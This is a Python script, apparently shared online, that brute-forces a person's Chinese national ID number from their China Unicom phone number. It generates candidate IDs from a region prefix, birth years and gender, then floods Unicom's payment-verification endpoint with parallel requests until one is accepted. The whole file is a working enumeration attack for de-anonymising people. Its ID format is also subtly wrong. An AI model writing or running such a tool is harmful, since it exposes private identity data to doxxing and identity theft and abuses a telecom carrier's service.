import requests
import concurrent.futures
import random

# 显示作者信息
print("搬运请带上作者：@PL66600 小b改联通穷举鸡主:@xb1235")

def verify_id(phone, id_number):
    url = "http://upay.10010.com/npfweb/NpfWeb/outerPayfee/getMustPayment"
    data = (
        f"commonBean.phoneNo={phone}&"
        f"commonBean.psptID={id_number}&"
        "commonBean.psptTypeCode=1&"
        "commonBean.provinceCode=074&"
        "commonBean.cityCode=741&"
        "commonBean.netCode=01"
    )
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(url, data=data, headers=headers)
    
    if response.status_code == 200:
        try:
            response_data = response.json()
            if response_data.get('out') == 'success':
                return id_number, '验证通过'
            else:
                return id_number, '验证不通过'
        except ValueError:
            return id_number, '响应数据格式错误'
    else:
        return id_number, f'请求失败，状态码：{response.status_code}'

def generate_id_numbers(start_prefix, start_year, end_year, gender):
    prefix = start_prefix
    id_numbers = []
    for year in range(end_year, start_year - 1, -1):
        for month in range(1, 13):
            for day in range(1, 32):  # This is a simplification; you may want to handle different months and leap years.
                birth_date_str = f"{year:04d}{month:02d}{day:02d}"
                gender_digit = '1' if gender == '男' else '2'
                id_number = f"{prefix}{birth_date_str}{random.randint(1000, 9999)}{gender_digit}"
                id_numbers.append(id_number)
    return id_numbers

def batch_verify_ids(phone, id_numbers):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_id = {executor.submit(verify_id, phone, id_number): id_number for id_number in id_numbers}
        for future in concurrent.futures.as_completed(future_to_id):
            id_number = future_to_id[future]
            try:
                id_number, result = future.result()
                print(f"身份证号: {id_number}, 核验结果: {result}")
                if result == '验证通过':
                    return id_number
            except Exception as exc:
                print(f"身份证号 {id_number} 生成异常: {exc}")
    return None

if __name__ == "__main__":
    print("请输入联通手机号码:")
    phone = input()
    print("请输入身份证号前6位（开头）:")
    start_prefix = input()
    print("请输入大概的年份范围（例如：1990 2000）:")
    start_year, end_year = map(int, input().split())
    print("请输入性别（男/女）:")
    gender = input()
    
    if gender not in ('男', '女'):
        print("性别输入错误，请输入'男'或'女'。")
    else:
        id_numbers = generate_id_numbers(start_prefix, start_year, end_year, gender)
        print(f"正在验证{gender}...")
        verified_id_number = batch_verify_ids(phone, id_numbers)
        if verified_id_number:
            print(f"找到验证通过的身份证号: {verified_id_number}")
        else:
            print("没有找到验证通过的身份证号。")
